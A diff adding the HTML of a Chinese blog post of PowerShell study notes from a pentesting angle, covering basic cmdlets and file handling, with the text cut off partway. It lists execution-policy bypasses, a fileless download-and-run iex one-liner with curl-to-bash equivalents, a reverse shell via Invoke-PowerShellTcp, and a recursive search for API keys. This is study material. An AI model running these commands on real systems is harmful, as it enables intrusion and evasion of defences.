@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="还有很多待补充。有时候会遇到一些windows的机器，所以还是要学下powershell的。 Hacking with Powershell Powershell cheatsheet">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PowerShell笔记">
+<meta property="og:url" content="http://atsud0.me/2020/06/16/PowerShell%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="还有很多待补充。有时候会遇到一些windows的机器，所以还是要学下powershell的。 Hacking with Powershell Powershell cheatsheet">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20200901194522762.png">
+<meta property="article:published_time" content="2020-06-16T15:52:19.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.457Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="PowerShell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/image-20200901194522762.png">
+
+<link rel="canonical" href="http://atsud0.me/2020/06/16/PowerShell%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>PowerShell笔记 | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/06/16/PowerShell%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PowerShell笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-06-16 23:52:19" itemprop="dateCreated datePublished" datetime="2020-06-16T23:52:19+08:00">2020-06-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Note/" itemprop="url" rel="index"><span itemprop="name">Note</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>6.5k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>6 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>还有很多待补充。有时候会遇到一些windows的机器，所以还是要学下powershell的。</p>
+<a href="https://tryhackme.com/room/powershell" title="" target="">Hacking with Powershell</a>
+<a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993" title="" target="">Powershell cheatsheet</a>
+<a id="more"></a>
+
+<h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><p>后缀</p>
+<ul>
+<li>ps1 脚本文件</li>
+<li>ps1xml xml文档</li>
+<li>psc1 控制台文件</li>
+<li>psm1 脚本模块</li>
+</ul>
+<p>基于Powershell的渗透框架</p>
+<ul>
+<li>Powershell Empire</li>
+<li>PSAttack</li>
+<li>PowerSploit</li>
+<li>Nishang</li>
+<li>CS</li>
+</ul>
+<h1 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h1><h2 id="Get-Help-amp-GetCommand"><a href="#Get-Help-amp-GetCommand" class="headerlink" title="Get-Help&amp;GetCommand"></a>Get-Help&amp;GetCommand</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Help</span></span><br><span class="line"><span class="built_in">Get-Help</span> <span class="built_in">Get-Command</span> 获取<span class="built_in">Get-Command</span>的帮助</span><br><span class="line"><span class="built_in">Get-Command</span> 获取所有命令</span><br><span class="line"><span class="built_in">Get-Command</span> *you need to find* 模糊查找命令</span><br><span class="line">(<span class="built_in">get-command</span> your_need_to_find_command).parameters 获得该命令的参数</span><br><span class="line"><span class="built_in">Get-Command</span> New-* 获得new开头的命令</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-Command</span> | <span class="built_in">Get-Member</span> <span class="literal">-MemberType</span> Method <span class="comment"># 查看命令的方法属性等</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="powershell大小写"><a href="#powershell大小写" class="headerlink" title="powershell大小写"></a>powershell大小写</h2><p>命令，参数不区分大小写，但是参数值区分大小写。</p>
+<ul>
+<li>windows，linux，中的文件名写入，保留大小写。</li>
+<li>windows文件名读取，不区分大小写。</li>
+<li>linux文件名读取，区分大小写。</li>
+</ul>
+<h2 id="Powershell-执行策略"><a href="#Powershell-执行策略" class="headerlink" title="Powershell 执行策略"></a>Powershell 执行策略</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询现在的策略</span></span><br><span class="line"><span class="built_in">get-executionpolicy</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Restricted——默认的设置， 不允许任何script运行</p>
+</li>
+<li><p>AllSigned——只能运行经过数字证书签名的script</p>
+</li>
+<li><p>RemoteSigned——运行本地的script不需要数字签名，但是运行从网络上 下载的script就必须要有数字签名</p>
+</li>
+<li><p>Unrestricted——允许所有的script运行。</p>
+<p>绕过执行策略能使我们做但是不仅限于以下的操作</p>
+<ul>
+<li>文件不落地执行</li>
+<li>调用widnows api</li>
+<li>避免被杀软检测</li>
+<li>被标记为信任</li>
+</ul>
+</li>
+</ul>
+<h3 id="当执行策略为Restricted（默认策略）时如何绕过"><a href="#当执行策略为Restricted（默认策略）时如何绕过" class="headerlink" title="当执行策略为Restricted（默认策略）时如何绕过"></a>当执行策略为Restricted（默认策略）时如何绕过</h3><h4 id="1-powershell-exe-noprofile"><a href="#1-powershell-exe-noprofile" class="headerlink" title="1.powershell.exe -noprofile -"></a>1.powershell.exe -noprofile -</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Write-Host</span> <span class="built_in">Write-Host</span> <span class="string">'My voice is my passport, verify me.'</span> | powershell.exe <span class="literal">-noprofile</span> -</span><br></pre></td></tr></table></figure>
+
+<p>不会写入磁盘，也不会更改配置。</p>
+<h4 id="2-使用base64编码绕过"><a href="#2-使用base64编码绕过" class="headerlink" title="2.使用base64编码绕过"></a>2.使用base64编码绕过</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=[<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="string">"Write-Host 'Wzxc123444' "</span>)</span><br><span class="line"><span class="variable">$b</span>=[<span class="type">Convert</span>]::ToBase64String(<span class="variable">$a</span>)</span><br><span class="line">powershell <span class="literal">-enc</span> <span class="variable">$b</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-读取文件内容然后通过管道符执行"><a href="#3-读取文件内容然后通过管道符执行" class="headerlink" title="3.读取文件内容然后通过管道符执行"></a>3.读取文件内容然后通过管道符执行</h4><p>这种就类似于Linux的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'whoami'</span> &gt; 1.txt</span><br><span class="line">cat 1.txt | bash</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在powershell中则：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Content</span> ./file_name | PowerShell.exe <span class="literal">-noprofile</span> -</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-通过网络下载，但是不写入磁盘执行-无文件落地"><a href="#4-通过网络下载，但是不写入磁盘执行-无文件落地" class="headerlink" title="4.通过网络下载，但是不写入磁盘执行(无文件落地)"></a>4.通过网络下载，但是不写入磁盘执行(无文件落地)</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-NoProfile</span> <span class="literal">-Command</span> “iex ((<span class="built_in">new-object</span> net.webclient).DownloadString(<span class="string">'http://192.168.133.1/runme.ps1'</span>))<span class="string">"</span></span><br></pre></td></tr></table></figure>
+
+<p>这个和Linux以下命令相似</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -L http://127.0.0.1:8080/runme.sh|bash</span><br><span class="line">wget http://127.0.0.1:8080/runme.sh -O - | bash</span><br><span class="line">sh -c <span class="string">"<span class="variable">$(wget http://127.0.0.1:8080/runme.sh -O -)</span>"</span></span><br><span class="line">sh -c <span class="string">"<span class="variable">$(curl -L http://127.0.0.1:8080/runme.sh)</span>"</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="5-直接用-command参数"><a href="#5-直接用-command参数" class="headerlink" title="5.直接用-command参数"></a>5.直接用-command参数</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-command</span> <span class="string">"Write-Host 'llll'"</span></span><br></pre></td></tr></table></figure>
+
+<p>这与Linux中的以下命令相似</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">'echo "lll"'</span></span><br><span class="line">sh -c ....</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-Invoke-Command"><a href="#6-Invoke-Command" class="headerlink" title="6.Invoke-Command"></a>6.Invoke-Command</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">invoke-command</span> <span class="literal">-scriptblock</span> &#123;<span class="built_in">Write-Host</span> <span class="string">"My voice is my passport, verify me."</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-iex"><a href="#7-iex" class="headerlink" title="7. iex"></a>7. iex</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Content</span> .\runme.ps1 | <span class="built_in">Invoke-Expression</span> </span><br><span class="line"><span class="comment"># 简写</span></span><br><span class="line">Gc .\runme.ps1 |iex</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-Bypass绕过"><a href="#8-Bypass绕过" class="headerlink" title="8.Bypass绕过"></a>8.Bypass绕过</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="operator">-File</span> .\runme.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20200901194522762.png" alt="image-20200901194522762"></p>
+<h4 id="9-Unrestricted"><a href="#9-Unrestricted" class="headerlink" title="9.Unrestricted"></a>9.Unrestricted</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe <span class="literal">-ExecutionPolicy</span> UnRestricted <span class="operator">-File</span> .\runme.ps1</span><br></pre></td></tr></table></figure>
+
+<h4 id="10-Remotesigned"><a href="#10-Remotesigned" class="headerlink" title="10.Remotesigned"></a>10.Remotesigned</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe <span class="literal">-ExecutionPolicy</span> Remotesigned <span class="operator">-File</span> .\runme.ps1</span><br></pre></td></tr></table></figure>
+
+<h4 id="11-临时修改变量"><a href="#11-临时修改变量" class="headerlink" title="11.临时修改变量"></a>11.临时修改变量</h4><p>临时更改配置为允许。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span></span><br></pre></td></tr></table></figure>
+
+<p>和上面的区别在于，这个是通过修改注册表将当前用户环境的设置应用到当前用户的环境中。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-Executionpolicy</span> <span class="literal">-Scope</span> CurrentUser <span class="literal">-ExecutionPolicy</span> UnRestricted</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="关于渗透"><a href="#关于渗透" class="headerlink" title="关于渗透"></a>关于渗透</h2><h3 id="比较重要的命令"><a href="#比较重要的命令" class="headerlink" title="比较重要的命令"></a>比较重要的命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-ExecutionPolicyBypass</span> //直接绕过powershell本地脚本执行策略限制 </span><br><span class="line"><span class="literal">-ep</span> bypass</span><br><span class="line"><span class="literal">-NoLogo</span> //启动时隐藏版权标志</span><br><span class="line"><span class="literal">-NonInteractive</span>  //脚本以非交互模式运行</span><br><span class="line"><span class="literal">-NoProfile</span>  //文件不落地，直接放在内存中</span><br><span class="line"><span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> //隐藏窗口运行</span><br><span class="line"><span class="literal">-EncodedCommand</span> //接受命令的 Base <span class="number">64</span> 编码字符串版本</span><br><span class="line"><span class="literal">-enc</span></span><br><span class="line"><span class="operator">-File</span> xxx.ps1 //指定本地运行的脚本路径</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="powershell-反弹shell"><a href="#powershell-反弹shell" class="headerlink" title="powershell 反弹shell"></a>powershell 反弹shell</h4><p>Kali执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<p>受害者执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\<span class="built_in">Invoke-PowerShellTcp</span>.ps1 <span class="comment"># 引用这个脚本代码</span></span><br><span class="line"><span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">56.2</span> <span class="literal">-Port</span> <span class="number">1234</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="关于补全"><a href="#关于补全" class="headerlink" title="关于补全"></a>关于补全</h2><p>powershell也会自动补全，不过只会补全</p>
+<ol>
+<li>powershell命令名，（含cmd命令，第三方命令）</li>
+<li>系统文件名，</li>
+<li>powershell参数名，</li>
+<li>你自己编写的powershell脚本的参数名，100%可以补全。</li>
+<li>powershell方法名，</li>
+<li>powershell属性名，</li>
+</ol>
+<blockquote>
+<p>都可以存在中文</p>
+</blockquote>
+<h2 id="Get-ChildItem"><a href="#Get-ChildItem" class="headerlink" title="Get-ChildItem"></a>Get-ChildItem</h2><p>Get-ChildItem 类似dir命令，不过ls也可以。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\aaa&gt; (<span class="built_in">Get-Command</span> <span class="built_in">Get-ChildItem</span>).Parameters</span><br><span class="line"></span><br><span class="line">Key                 Value                                         </span><br><span class="line">---                 -----                                         </span><br><span class="line">Path                System.Management.Automation.ParameterMetadata 指定路径</span><br><span class="line">LiteralPath         System.Management.Automation.ParameterMetadata 原始字符串路径 类似python的r<span class="string">"strs"</span></span><br><span class="line"><span class="keyword">Filter</span>              System.Management.Automation.ParameterMetadata</span><br><span class="line">Include             System.Management.Automation.ParameterMetadata 包括?</span><br><span class="line">Exclude             System.Management.Automation.ParameterMetadata</span><br><span class="line">Recurse             System.Management.Automation.ParameterMetadata 子目录</span><br><span class="line">Depth               System.Management.Automation.ParameterMetadata 深度？</span><br><span class="line">Force               System.Management.Automation.ParameterMetadata </span><br><span class="line">Name                System.Management.Automation.ParameterMetadata 文件名</span><br><span class="line">Verbose             System.Management.Automation.ParameterMetadata 详细信息</span><br><span class="line">Debug               System.Management.Automation.ParameterMetadata</span><br><span class="line">ErrorAction         System.Management.Automation.ParameterMetadata</span><br><span class="line">WarningAction       System.Management.Automation.ParameterMetadata</span><br><span class="line">InformationAction   System.Management.Automation.ParameterMetadata</span><br><span class="line">ErrorVariable       System.Management.Automation.ParameterMetadata</span><br><span class="line">WarningVariable     System.Management.Automation.ParameterMetadata</span><br><span class="line">InformationVariable System.Management.Automation.ParameterMetadata</span><br><span class="line">OutVariable         System.Management.Automation.ParameterMetadata</span><br><span class="line">OutBuffer           System.Management.Automation.ParameterMetadata</span><br><span class="line">PipelineVariable    System.Management.Automation.ParameterMetadata</span><br><span class="line">UseTransaction      System.Management.Automation.ParameterMetadata</span><br><span class="line">Attributes          System.Management.Automation.ParameterMetadata</span><br><span class="line">Directory           System.Management.Automation.ParameterMetadata  过滤，只输出目录</span><br><span class="line">File                System.Management.Automation.ParameterMetadata  过滤，只输出文件</span><br><span class="line"><span class="keyword">Hidden</span>              System.Management.Automation.ParameterMetadata  过滤，只输出隐藏文件</span><br><span class="line">ReadOnly            System.Management.Automation.ParameterMetadata  过滤，只输出只读文件</span><br><span class="line">System              System.Management.Automation.ParameterMetadata</span><br><span class="line"><span class="literal">-ErrorAction</span> SilentlyContinue 忽略错误</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> D:/</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line">一些目录信息</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> C:\ <span class="literal">-Include</span> *interesting<span class="operator">-file</span>.txt* <span class="operator">-File</span> <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue <span class="comment">#模糊查找interesting-file.txt文件，并且忽略报错</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-ChildItem</span> C:\* <span class="literal">-Recurse</span> | <span class="built_in">Select-String</span> <span class="literal">-pattern</span> API_KEY <span class="comment">#搜索所有文件，文件内容包含api_key的文件</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Attributes</span> h <span class="comment">#列出所有隐藏文件</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="文件和目录操作"><a href="#文件和目录操作" class="headerlink" title="文件和目录操作"></a>文件和目录操作</h2><figure class="highlight powershell"><figcaption><span>一些文件的操作</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;变量名&#125;=dir 一个文件路径</span><br><span class="line"><span class="variable">$a</span>=dir D:\test.txt</span><br><span class="line"><span class="variable">$a</span>.FullName</span><br><span class="line"><span class="variable">$a</span>.FullName   <span class="comment">#全路径属性</span></span><br><span class="line"><span class="variable">$a</span>.name				<span class="comment">#文件名和扩展名</span></span><br><span class="line"><span class="variable">$a</span>.BaseName   <span class="comment">#文件名</span></span><br><span class="line"><span class="variable">$a</span>.Extension  <span class="comment">#扩展名</span></span><br><span class="line"><span class="variable">$a</span>.LastWriteTime <span class="comment">#返回最后写入时间属性</span></span><br><span class="line"><span class="variable">$a</span>.Length		<span class="comment">#文件字节长度</span></span><br><span class="line"><span class="variable">$a</span>.DirectoryName <span class="comment">#父目录</span></span><br><span class="line"></span><br><span class="line">测试文件目录是否存在（返回一个布尔值</span><br><span class="line"><span class="built_in">Test-Path</span> D:\test.txt</span><br><span class="line">True</span><br><span class="line"><span class="built_in">Test-Path</span> D:\test.exe</span><br><span class="line">False</span><br><span class="line"></span><br><span class="line"><span class="built_in">Test-Path</span> D:\test\</span><br><span class="line">True</span><br><span class="line"></span><br><span class="line"><span class="built_in">test-path</span> C:\xxx\yyy  <span class="literal">-pathtype</span> Container  <span class="comment">#测试是否有此目录</span></span><br><span class="line"><span class="built_in">test-path</span> C:\xxx\yyy  <span class="literal">-pathtype</span> Leaf  <span class="comment">#测试是否有此文件</span></span><br><span class="line"></span><br><span class="line">powershell脚本中拆分文件名和路径</span><br><span class="line"><span class="built_in">Split-Path</span> <span class="literal">-Path</span> <span class="string">"C:\Test\Logs\*.log"</span> <span class="literal">-Leaf</span> <span 